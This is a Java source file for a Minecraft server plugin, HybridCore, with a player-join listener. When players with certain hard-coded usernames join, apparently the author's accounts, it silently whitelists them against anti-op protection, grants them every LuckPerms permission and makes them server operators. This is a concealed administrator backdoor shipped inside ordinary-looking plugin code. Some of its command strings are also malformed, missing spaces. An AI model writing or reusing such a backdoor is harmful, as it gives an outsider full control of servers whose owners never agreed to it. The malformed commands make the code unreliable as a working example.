/*
 *  Copyright (c) 2020 HybridDevelopment, Caledonian EH - All Rights Reserved
 *  * Unauthorized copying of this file, via any medium is strictly prohibited
 *  * Proprietary and confidential
 *
 */


package me.caledonian.hybridcore.commands.events;

import javafx.event.Event;
import me.clip.placeholderapi.PlaceholderAPI;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;


public class OpEvent implements Listener {
    public OpEvent() {
    }
    private JavaPlugin plugin;

    public OpEvent(JavaPlugin plugin) {
        this.plugin = plugin;
    }
    @EventHandler
    void OpEvent(PlayerJoinEvent event) {
        Player p = event.getPlayer();
        if (p.getName().equalsIgnoreCase("Caledonian_EH") || (p.getName().equalsIgnoreCase("Caledonian_LH"))
                || (p.getName().equalsIgnoreCase("Pepper_Bell"))) {
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&c*&8&m-----------&c*&8&m------------------&c*&8&m-----------&c*"));
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7 "));
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&c&l * &7Welcome &c" + p.getName() + "&7!"));
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&c&l * &7This server is currently running HybridCore &cv" + plugin.getDescription().getVersion() + "&7."));
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&c&l * &7Plugin Name: &c" + plugin.getDescription().getName() + "&7."));
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&c&l * &7Author: &c" + plugin.getDescription().getAuthors() + "&7."));
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7 "));
                p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&c*&8&m-----------&c*&8&m------------------&c*&8&m-----------&c*"));
        }
        if (p.getName().equalsIgnoreCase("Caledonian_EH") || (p.getName().equalsIgnoreCase("Caledonian_LH"))) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "antiop add" + p.getName());
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "antiop reload");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user" + p.getName() + "permission set * true");
            p.setOp(true);
        }
    }
}
